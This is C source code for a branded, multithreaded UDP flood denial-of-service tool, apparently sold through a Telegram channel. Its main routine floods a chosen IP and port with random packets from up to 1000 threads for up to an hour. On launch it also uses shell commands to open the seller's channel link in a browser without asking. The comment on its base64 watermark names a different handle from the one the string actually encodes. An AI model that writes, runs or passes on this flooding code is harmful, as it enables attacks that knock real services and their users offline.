#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <ctype.h>

#define MAX_THREADS 1000
#define TARGET_IP_LEN 16
#define BUFFER_SIZE 1024

const char *base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

char *target_ip;
int target_port;
int attack_duration;
int num_threads;
int attack_running = 1;
time_t start_time;

// Your Channel Link
const char *channel_link = "https://t.me/gaming0964432";

// Your Watermark (Base64 encoded of "This file is made by :- @ONEPLUSLOADERSELLER")
const char *watermark_base64 = "VGhpcyBmaWxlIGlzIG1hZGUgYnkgOi0gQFBSSU1FX1hfQVJNWQo=";

char *base64_decode(const char *input) {
    int len = strlen(input);
    int output_len = len * 3 / 4;
    char *output = malloc(output_len + 1);
    int i, j = 0;
    int val = 0, valb = -8;
    
    for (i = 0; i < len; i++) {
        const char *p = strchr(base64_chars, input[i]);
        if (!p) continue;
        val = (val << 6) + (p - base64_chars);
        valb += 6;
        if (valb >= 0) {
            output[j++] = (val >> valb) & 0xFF;
            valb -= 8;
        }
    }
    output[j] = '\0';
    return output;
}

char *assemble_base64_message() {
    return base64_decode(watermark_base64);
}

void show_banner() {
    printf("\n");
    printf("██████╗ ██████╗ ██╗███╗   ███╗███████╗    ██████╗ ██████╗ ███╗   ███╗██╗   ██╗\n");
    printf("██╔══██╗██╔══██╗██║████╗ ████║██╔════╝    ██╔══██╗██╔══██╗████╗ ████║╚██╗ ██╔╝\n");
    printf("██████╔╝██████╔╝██║██╔████╔██║█████╗      ██████╔╝██████╔╝██╔████╔██║ ╚████╔╝ \n");
    printf("██╔═══╝ ██╔══██╗██║██║╚██╔╝██║██╔══╝      ██╔══██╗██╔══██╗██║╚██╔╝██║  ╚██╔╝  \n");
    printf("██║     ██║  ██║██║██║ ╚═╝ ██║███████╗    ██║  ██║██║  ██║██║ ╚═╝ ██║   ██║   \n");
    printf("╚═╝     ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝   \n");
    printf("\n");
    printf("              ==== @ONEPLUSLOADERSELLER DDOS TOOL ====\n");
    printf("              ==== Channel: https://t.me/gaming0964432 ====\n");
    printf("\n");
}

void open_url() {
    char *decoded = assemble_base64_message();
    printf("[+] Watermark: %s\n", decoded);
    free(decoded);
    
    printf("[+] Opening channel link...\n");
    
    if (system("command -v xdg-open > /dev/null") == 0) {
        char cmd[256];
        snprintf(cmd, sizeof(cmd), "xdg-open %s", channel_link);
        system(cmd);
    } else if (system("command -v gnome-open > /dev/null") == 0) {
        char cmd[256];
        snprintf(cmd, sizeof(cmd), "gnome-open %s", channel_link);
        system(cmd);
    } else if (system("command -v open > /dev/null") == 0) {
        char cmd[256];
        snprintf(cmd, sizeof(cmd), "open %s", channel_link);
        system(cmd);
    } else if (system("command -v start > /dev/null") == 0) {
        char cmd[256];
        snprintf(cmd, sizeof(cmd), "start %s", channel_link);
        system(cmd);
    } else {
        printf("[!] Join Channel: %s\n", channel_link);
    }
}

void *send_udp_traffic(void *arg) {
    int sock;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];
    int thread_id = *(int*)arg;
    int packet_count = 0;
    
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("[-] Socket creation failed");
        pthread_exit(NULL);
    }
    
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);
    server_addr.sin_addr.s_addr = inet_addr(target_ip);
    
    // Fill buffer with random data
    for (int i = 0; i < BUFFER_SIZE; i++) {
        buffer[i] = (rand() % 256);
    }
    
    while (attack_running) {
        if (sendto(sock, buffer, BUFFER_SIZE, 0, 
                   (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("[-] Send failed");
            break;
        }
        packet_count++;
        
        if (difftime(time(NULL), start_time) >= attack_duration) {
            attack_running = 0;
            break;
        }
    }
    
    close(sock);
    printf("[Thread %d] Sent %d packets\n", thread_id, packet_count);
    return NULL;
}

int is_expired(time_t start, int duration) {
    return difftime(time(NULL), start) >= duration;
}

int main(int argc, char *argv[]) {
    pthread_t threads[MAX_THREADS];
    int thread_ids[MAX_THREADS];
    
    show_banner();
    open_url();
    
    if (argc != 5) {
        printf("[-] Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
        printf("\n");
        printf("[+] Example:\n");
        printf("    %s 192.168.1.1 80 60 500\n", argv[0]);
        printf("\n");
        return 1;
    }
    
    target_ip = argv[1];
    target_port = atoi(argv[2]);
    attack_duration = atoi(argv[3]);
    num_threads = atoi(argv[4]);
    
    // Validate inputs
    if (num_threads > MAX_THREADS) {
        printf("[!] Threads limited to %d\n", MAX_THREADS);
        num_threads = MAX_THREADS;
    }
    
    if (attack_duration > 3600) {
        printf("[!] Duration limited to 3600 seconds\n");
        attack_duration = 3600;
    }
    
    printf("\n");
    printf("[+] =========================================\n");
    printf("[+] @ONEPLUSLOADERSELLER ATTACK STARTED!\n");
    printf("[+] Target: %s:%d\n", target_ip, target_port);
    printf("[+] Duration: %d seconds\n", attack_duration);
    printf("[+] Threads: %d\n", num_threads);
    printf("[+] Method: UDP FLOOD\n");
    printf("[+] =========================================\n");
    printf("\n");
    
    start_time = time(NULL);
    attack_running = 1;
    
    // Create threads
    for (int i = 0; i < num_threads; i++) {
        thread_ids[i] = i;
        if (pthread_create(&threads[i], NULL, send_udp_traffic, &thread_ids[i]) != 0) {
            perror("[-] Thread creation failed");
            attack_running = 0;
            break;
        }
    }
    
    // Wait for attack to complete
    int elapsed = 0;
    while (attack_running && !is_expired(start_time, attack_duration)) {
        sleep(1);
        elapsed++;
        if (elapsed % 10 == 0) {
            printf("[+] Attack in progress... %d/%d seconds\n", elapsed, attack_duration);
        }
    }
    
    attack_running = 0;
    
    // Join all threads
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("\n");
    printf("[+] =========================================\n");
    printf("[+] @ONEPLUSLOADERSELLER ATTACK COMPLETED!\n");
    printf("[+] Total Time: %d seconds\n", attack_duration);
    printf("[+] Target: %s:%d\n", target_ip, target_port);
    printf("[+] =========================================\n");
    printf("\n");
    
    return 0;
}